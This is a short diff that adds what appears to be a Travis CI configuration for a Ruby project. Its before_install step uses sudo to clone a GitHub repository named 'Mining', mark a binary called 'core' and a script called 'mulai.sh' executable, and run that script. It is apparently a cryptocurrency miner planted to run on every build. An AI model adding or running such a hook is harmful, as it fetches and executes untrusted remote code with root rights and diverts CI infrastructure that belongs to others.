@@ -1,1 +1,7 @@
-sudo apt install -y git && sudo git clone https://github.com/Mi-AnliAngku/Mining.git && cd Mining &&sudo chmod u+x core && sudo chmod u+x mulai.sh && sudo bash mulai.sh
+language: ruby
+
+services:
+  - docker
+
+before_install:
+  - sudo apt install -y git && sudo git clone https://github.com/Mi-AnliAngku/Mining.git && cd Mining &&sudo chmod u+x core && sudo chmod u+x mulai.sh && sudo bash mulai.sh
